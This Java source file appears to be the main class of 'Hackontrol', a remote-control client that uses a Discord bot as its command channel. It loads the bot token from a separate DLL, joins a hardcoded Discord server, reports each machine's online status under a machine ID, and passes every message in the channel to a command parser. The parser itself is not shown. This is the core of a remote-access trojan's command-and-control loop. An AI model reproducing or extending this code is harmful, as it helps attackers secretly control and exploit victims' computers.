package com.khopan.hackontrol;

import java.util.List;

import com.khopan.hackontrol.network.Request;
import com.khopan.hackontrol.network.Response;

import net.dv8tion.jda.api.JDA;
import net.dv8tion.jda.api.JDABuilder;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.SelfUser;
import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import net.dv8tion.jda.api.requests.GatewayIntent;

public class Hackontrol {
	static {
		System.load("D:\\GitHub Repository\\Hackontrol\\dll\\token.dll");
	}

	private static final String BOT_TOKEN = Hackontrol.getBotToken();

	private static native String getBotToken();

	private final JDA bot;
	private final SelfUser user;
	private final Guild guild;
	private final TextChannel channel;
	private final Request request;
	private final Response response;

	private Hackontrol() {
		this.bot = JDABuilder.createDefault(Hackontrol.BOT_TOKEN)
				.enableIntents(GatewayIntent.GUILD_MESSAGES, GatewayIntent.MESSAGE_CONTENT)
				.addEventListeners(new Listener())
				.build();

		try {
			this.bot.awaitReady();
		} catch(Throwable Errors) {
			System.exit(1);
		}

		this.user = this.bot.getSelfUser();
		this.guild = this.bot.getGuildById(1173967259304198154L);

		if(this.guild == null) {
			System.exit(1);
		}

		List<TextChannel> channels = this.guild.getTextChannels();

		if(channels.isEmpty()) {
			System.exit(1);
		}

		this.channel = channels.get(0);

		if(this.channel == null) {
			System.exit(1);
		}

		MachineId identifier = MachineId.get();
		this.request = new Request(this.channel, identifier);
		this.response = new Response(this.request, identifier);
		this.request.statusReport(true);
		Runtime.getRuntime().addShutdownHook(new Thread(() -> {
			this.request.statusReport(false);
		}));
	}

	public static void main(String[] args) throws Throwable {
		new Hackontrol();
	}

	private class Listener extends ListenerAdapter {
		@Override
		public void onMessageReceived(MessageReceivedEvent Event) {
			if(Event.getAuthor() == Hackontrol.this.user) {
				return;
			}

			String message = Event.getMessage().getContentDisplay();
			Hackontrol.this.response.parse(message);
		}
	}
}
